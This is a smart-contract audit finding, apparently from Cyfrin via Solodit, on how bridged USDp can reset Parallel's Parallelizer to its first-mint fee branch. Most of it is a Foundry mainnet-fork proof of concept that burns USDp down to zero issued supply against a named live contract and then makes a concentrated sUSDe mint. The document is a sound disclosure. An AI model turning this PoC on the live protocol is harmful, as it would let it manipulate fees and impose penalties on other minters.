---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-03-04-cyfrin-parallel3-1-v2-0-3-9
ingested_at: '2026-08-23T05:04:32Z'
protocol_category: []
published_at: '2026-03-04T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-04-cyfrin-parallel3.1-v2.0.md
tags:
- firm:cyfrin
- report:2026-03-04-cyfrin-parallel3-1-v2-0
title: First mint bug becomes reproducible in the presence of bridgeable tokens
vuln_class: []
---

# First mint bug becomes reproducible in the presence of bridgeable tokens

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-03-04-cyfrin-parallel3.1-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-04-cyfrin-parallel3.1-v2.0.md)_

---

**Description**

first mint uses flat first-fee branch when `normalizedStablesMem == 0` can be made repeatedly exploitable, not just at initial deployment, by combining bridge-in supply with burn-based depletion.

Parallelizer's `Swapper::_quoteFees` will fall back to applying `yFeeMint[0]` when `ts.normalizedStables`/`normalizedStablesMem` is zero. Under normal assumptions, and without the use of bridging this is a one-time bootstrap condition. If the first minter is not malicious then the existence of other minters means the likelihood of `ts.normalizedStables` ever reaching zero is essentially nothing.

However, with bridging enabled, an attacker can recreate it by acquiring USDp on another chain, bridging it, and then burning across collaterals until local issued state is depleted to zero.

Once reset, the attacker can perform a large first mint into a chosen collateral at the (usually low) rate of `yFeeMint[0]`. Depending on the fee structure of the collaterals this can have interesting, and damaging consequences.

**Impact:** Bridging makes the first-mint weakness operationally repeatable via bridging and burning.

An attacker can repeatedly force the protocol into the first-mint branch and concentrate issuance into one collateral.

**Proof of Concept:** The following PoC forks the state of mainnet and shows that an attacker can:
- burn USDp repeatedly so that `ts.normalizedStables == 0`
- mint 400,000 USDp using sUSDe

Once they have done that, any other user that tries to mint USDp using sUSDe will suffer an enormous penalty. This is because the mint fee structure of sUSDe charges a 999% fee if the proportion of sUSDE in Parallelizer exceeds 95%.

However, since the first mint was so large a substantial amount of other collateral must be added to bring the fee for minting with sUSDe down.

The PoC shows that ~26,000 frxUSD must be minted for the mint fee on sUSDe to drop down to 0% again.

[parallel-protocolMainnetFirstMintResetFork.t.sol](https://github.com/parallel-protocol/parallel-core/blob/audit/100proof/Parallel-Parallelizer/tests/units/parallel-protocolMainnetFirstMintResetFork.t.sol)
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import { Test, console } from "@forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import { DecimalString } from "../utils/DecimalString.sol";

interface ILiveParallelizerReset {
  function tokenP() external view returns (address);
  function getCollateralList() external view returns (address[] memory);
  function getTotalIssued() external view returns (uint256 stablecoinsIssued);
  function getIssuedByCollateral(address collateral) external view returns (uint256 stablecoinsFromCollateral, uint256 stablecoinsIssued);
  function quoteIn(uint256 amountIn, address tokenIn, address tokenOut) external view returns (uint256 amountOut);
  function quoteOut(uint256 amountOut, address tokenIn, address tokenOut) external view returns (uint256 amountIn);
  function swapExactInput(
    uint256 amountIn,
    uint256 amountOutMin,
    address tokenIn,
    address tokenOut,
    address to,
    uint256 deadline
  )
    external
    returns (uint256 amountOut);
  function swapExactOutput(
    uint256 amountOut,
    uint256 amountInMax,
    address tokenIn,
    address tokenOut,
    address to,
    uint256 deadline
  )
    external
    returns (uint256 amountIn);
  function getCollateralMintFees(address collateral) external view returns (uint64[] memory xFeeMint, int64[] memory yFeeMint);
  function getCollateralBurnFees(address collateral) external view returns (uint64[] memory xFeeBurn, int64[] memory yFeeBurn);
}

/// @notice Fork PoC at block 24,497,000:
/// 1) Deplete `getTotalIssued()` to zero via burn on live collateral set
/// 2) Show concentrated sUSDe mint makes next small sUSDe mint very expensive
/// 3) Find the frxUSD second-mint breakpoint where sUSDe quote exits punitive regime
contract CyfrinMainnetFirstMintResetForkTest is Test {
  uint256 internal constant FORK_BLOCK = 24_497_000;
  address internal constant PARALLELIZER_USDP = 0x6efeDDF9269c3683Ba516cb0e2124FE335F262a2;
  uint256 internal constant TARGET_USDP = 100_000e18;

  ILiveParallelizerReset internal parallelizer;
  IERC20 internal usdp;
  uint8 internal usdpDecimals;

  address internal attacker = makeAddr("attacker-reset");

  function setUp() external {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, FORK_BLOCK);

    parallelizer = ILiveParallelizerReset(PARALLELIZER_USDP);
    usdp = IERC20(parallelizer.tokenP());
    usdpDecimals = IERC20Metadata(address(usdp)).decimals();
  }

  function test_cyfrin_mainnetFork_resetToZero_thenFirstMintBetterThanNext() external {
    console.log("=== Mainnet fork reset-to-zero then first-mint edge ===");
    console.log("Fork block:", FORK_BLOCK);
    console.log("Parallelizer:", PARALLELIZER_USDP);
    _logAmount("Initial total issued.............: ", parallelizer.getTotalIssued(), usdpDecimals);
    console.log("");

    address[] memory collaterals = parallelizer.getCollateralList();
    require(collaterals.length > 0, "no collateral");

    uint256 totalIssuedBefore = parallelizer.getTotalIssued();
    // Simulate bridge-in principal availability on destination chain.
    deal(address(usdp), attacker, totalIssuedBefore * 3 + 1e18, true);
    vm.prank(attacker);
    usdp.approve(PARALLELIZER_USDP, type(uint256).max);

    uint256 chosenIssued;
    address chosenCollateral;
    uint256 collateralCount = collaterals.length;
    uint256[] memory issuedTrace = new uint256[](41);
    uint256 traceLen;
    issuedTrace[traceLen++] = totalIssuedBefore;
    for (uint256 pass; pass < 40; ++pass) {
      bool progress;
      for (uint256 i; i < collateralCount; ++i) {
        address collateral = collaterals[i];
        (uint256 issuedFromCollat,) = parallelizer.getIssuedByCollateral(collateral);
        if (issuedFromCollat == 0) continue;

        uint256 burnable = _maxBurnable(collateral, issuedFromCollat);

        if (burnable > 0) {
          _burnAsAttacker(burnable, collateral);
          progress = true;
        }

        // Keep largest-collateral bucket for the post-reset first mint check.
        if (issuedFromCollat > chosenIssued) {
          chosenIssued = issuedFromCollat;
          chosenCollateral = collateral;
        }
      }
      if (!progress) break;
      uint256 totalAfterPass = parallelizer.getTotalIssued();
      issuedTrace[traceLen++] = totalAfterPass;
      if (totalAfterPass == 0) break;
    }
    console.log("");
    console.log("Depletion iterations.............:", traceLen - 1);
    console.log(
      string.concat("Issued trace (USDp).............: ", _formatAmountArray(issuedTrace, traceLen, usdpDecimals))
    );

    uint256 totalIssuedAfter = parallelizer.getTotalIssued();
    _logAmount("Total issued after burns.........: ", totalIssuedAfter, usdpDecimals);
    assertEq(totalIssuedAfter, 0, "expected fork state to reach totalIssued == 0");

    require(chosenCollateral != address(0), "no chosen collateral");
    uint8 chosenDecimals = IERC20Metadata(chosenCollateral).decimals();
    uint256 susdeMintTarget = 400_000e18;
    uint256 susdeSmallTopUp = 10_000e18;
    uint256 frxUsdSearchUpper = 100_000e18;

    // 1) Concentrate issuance into sUSDe.
    uint256 spentInitialSUSDe = _mintExactOutAsAttacker(susdeMintTarget, chosenCollateral);
    (uint256 issuedChosenAfterFirst,) = parallelizer.getIssuedByCollateral(chosenCollateral);
    uint256 quoteTopUpBeforeRebalance = parallelizer.quoteOut(susdeSmallTopUp, chosenCollateral, address(usdp));

    // 2) Find minimum frxUSD second mint where +10k sUSDe cost returns to zero-fee reference.
    address frxUsd = _findCollateralBySymbol("frxUSD");
    uint256 zeroFeeReferenceQuote = _quoteTopUpAfterFrxMint(chosenCollateral, frxUsd, 50_000e18, susdeSmallTopUp);
    uint256 breakEvenFrxUsd = _findBreakEvenFrxUsdForZeroFeeQuote(
      chosenCollateral, frxUsd, susdeSmallTopUp, zeroFeeReferenceQuote, frxUsdSearchUpper
    );
    uint256 quoteAtBreakEven = _quoteTopUpAfterFrxMint(chosenCollateral, frxUsd, breakEvenFrxUsd, susdeSmallTopUp);

    console.log("");
    console.log("Post-reset concentration sensitivity:");
    console.log("Collateral:", chosenCollateral);
    console.log("Symbol:", IERC20Metadata(chosenCollateral).symbol());
    _logAmount("Initial sUSDe mint target USDp....: ", susdeMintTarget, usdpDecimals);
    _logAmount("Initial sUSDe collateral spent....: ", spentInitialSUSDe, chosenDecimals);
    _logAmount("Issued USDp after first mint......: ", issuedChosenAfterFirst, usdpDecimals);
    _logAmount("Cost for +10k sUSDe before frxUSD.: ", quoteTopUpBeforeRebalance, chosenDecimals);
    console.log("");
    console.log("Break-even collateral:", frxUsd);
    console.log("Symbol:", IERC20Metadata(frxUsd).symbol());
    _logAmount("Zero-fee ref (+10k sUSDe).........: ", zeroFeeReferenceQuote, chosenDecimals);
    _logAmount("Break-even frxUSD second mint.....: ", breakEvenFrxUsd, usdpDecimals);
    _logAmount("Cost for +10k sUSDe at break-even.: ", quoteAtBreakEven, chosenDecimals);
    _logAmount("Baseline +10k sUSDe cost..........: ", quoteTopUpBeforeRebalance, chosenDecimals);
    // Exposure checkpoints from sUSDe mint curve: xFee [0.94, 0.95]
    _logAmount("x at 95% exposure (analytic)......: ", 21_052_631578947368421053, 18);
    _logAmount("x at 94% exposure (analytic)......: ", 25_531_914893617021276595, 18);

    assertGt(
      quoteTopUpBeforeRebalance, quoteAtBreakEven, "break-even second mint should lower next small sUSDe mint cost"
    );
  }

  function test_cyfrin_mainnetFork_logAllCollateralFeeCurves() external view {
    console.log("=== Mainnet fork collateral fee curves ===");
    console.log("Fork block:", FORK_BLOCK);
    console.log("Parallelizer:", PARALLELIZER_USDP);
    console.log("");

    address[] memory collaterals = parallelizer.getCollateralList();
    for (uint256 i; i < collaterals.length; ++i) {
      address collateral = collaterals[i];
      (uint64[] memory xMint, int64[] memory yMint) = parallelizer.getCollateralMintFees(collateral);
      (uint64[] memory xBurn, int64[] memory yBurn) = parallelizer.getCollateralBurnFees(collateral);

      console.log("Collateral:", collateral);
      console.log("Symbol:", IERC20Metadata(collateral).symbol());
      console.log(string.concat("xFeeMint (1e9 exposure).........: ", _formatUint64_1e9_Array(xMint)));
      console.log(string.concat("yFeeMint (1e9 fee)..............: ", _formatInt64_1e9_Array(yMint)));
      console.log(string.concat("xFeeBurn (1e9 exposure).........: ", _formatUint64_1e9_Array(xBurn)));
      console.log(string.concat("yFeeBurn (1e9 fee)..............: ", _formatInt64_1e9_Array(yBurn)));
      console.log("");
    }
  }

  function _burnAsAttacker(uint256 amountIn, address collateral) internal returns (uint256 out) {
    vm.startPrank(attacker);
    out = parallelizer.swapExactInput(amountIn, 0, address(usdp), collateral, attacker, block.timestamp + 1 days);
    vm.stopPrank();
  }

  function _mintExactOutAsAttacker(uint256 amountOut, address collateral) internal returns (uint256 spent) {
    uint256 quoteIn = parallelizer.quoteOut(amountOut, collateral, address(usdp));
    uint8 dec = IERC20Metadata(collateral).decimals();
    uint256 padding = 10 ** dec;
    deal(collateral, attacker, IERC20(collateral).balanceOf(attacker) + quoteIn + padding, true);

    vm.startPrank(attacker);
    IERC20(collateral).approve(PARALLELIZER_USDP, type(uint256).max);
    spent = parallelizer.swapExactOutput(
      amountOut, type(uint256).max, collateral, address(usdp), attacker, block.timestamp + 1 days
    );
    vm.stopPrank();
  }

  function _maxBurnable(address collateral, uint256 upper) internal returns (uint256) {
    if (upper == 0) return 0;
    if (_canBurn(upper, collateral)) return upper;

    uint256 low;
    uint256 high = upper;
    while (low < high) {
      uint256 mid = (low + high + 1) / 2;
      if (_canBurn(mid, collateral)) low = mid;
      else high = mid - 1;
    }
    return low;
  }

  function _canBurn(uint256 amountIn, address collateral) internal returns (bool ok) {
    uint256 snap = vm.snapshotState();
    try this._tryBurn(amountIn, collateral) returns (uint256) {
      ok = true;
    } catch {
      ok = false;
    }
    vm.revertToState(snap);
  }

  function _tryBurn(uint256 amountIn, address collateral) external returns (uint256 out) {
    vm.startPrank(attacker);
    out = parallelizer.swapExactInput(amountIn, 0, address(usdp), collateral, attacker, block.timestamp + 1 days);
    vm.stopPrank();
  }

  function _findCollateralBySymbol(string memory symbol) internal view returns (address) {
    address[] memory collaterals = parallelizer.getCollateralList();
    for (uint256 i; i < collaterals.length; ++i) {
      if (_eq(IERC20Metadata(collaterals[i]).symbol(), symbol)) return collaterals[i];
    }
    revert("collateral symbol not found");
  }

  function _eq(string memory a, string memory b) internal pure returns (bool) {
    return keccak256(bytes(a)) == keccak256(bytes(b));
  }

  function _quoteTopUpAfterFrxMint(address susde, address frxUsd, uint256 frxUsdMintTarget, uint256 susdeTopUp)
    internal
    returns (uint256 quote)
  {
    uint256 snap = vm.snapshotState();
    _mintExactOutAsAttacker(frxUsdMintTarget, frxUsd);
    quote = parallelizer.quoteOut(susdeTopUp, susde, address(usdp));
    vm.revertToState(snap);
  }

  function _findBreakEvenFrxUsdForZeroFeeQuote(
    address susde,
    address frxUsd,
    uint256 susdeTopUp,
    uint256 zeroFeeReferenceQuote,
    uint256 searchUpper
  )
    internal
    returns (uint256)
  {
    uint256 low;
    uint256 high = searchUpper;
    while (low < high) {
      uint256 mid = (low + high) / 2;
      uint256 quoteMid = _quoteTopUpAfterFrxMint(susde, frxUsd, mid, susdeTopUp);
      if (quoteMid <= zeroFeeReferenceQuote) high = mid;
      else low = mid + 1;
    }
    return low;
  }

  function _logAmount(string memory label, uint256 amount, uint8 decimals) internal pure {
    console.log(string.concat(label, "  ", DecimalString.formatFixed(amount, decimals)));
  }

  function _formatAmountArray(uint256[] memory values, uint256 len, uint8 decimals) internal pure returns (string memory) {
    bytes memory out = abi.encodePacked("[");
    for (uint256 i; i < len; ++i) {
      out = abi.encodePacked(out, DecimalString.formatFixed(values[i], decimals));
      if (i + 1 < len) out = abi.encodePacked(out, ", ");
    }
    out = abi.encodePacked(out, "]");
    return string(out);
  }

  function _formatUint64_1e9_Array(uint64[] memory values) internal pure returns (string memory) {
    bytes memory out = abi.encodePacked("[");
    for (uint256 i; i < values.length; ++i) {
      out = abi.encodePacked(out, DecimalString.formatFixed(uint256(values[i]), 9));
      if (i + 1 < values.length) out = abi.encodePacked(out, ", ");
    }
    out = abi.encodePacked(out, "]");
    return string(out);
  }

  function _formatInt64_1e9_Array(int64[] memory values) internal pure returns (string memory) {
    bytes memory out = abi.encodePacked("[");
    for (uint256 i; i < values.length; ++i) {
      int64 v = values[i];
      if (v < 0) out = abi.encodePacked(out, "-");
      uint256 absV = uint256(v < 0 ? int256(-v) : int256(v));
      out = abi.encodePacked(out, DecimalString.formatFixed(absV, 9));
      if (i + 1 < values.length) out = abi.encodePacked(out, ", ");
    }
    out = abi.encodePacked(out, "]");
    return string(out);
  }
}
```

**Recommended Mitigation:** Consider documenting this behavior. Before setting up negative fees, test extensively considering this behavior to verify not extraction is possible by pulling off this attack and abusing the negative fees to slowly drain the collateral out of the system

**Parallel:** Acknowledged

**Cyfrin:** Added an operational note on the executive summary about this behavior

\clearpage
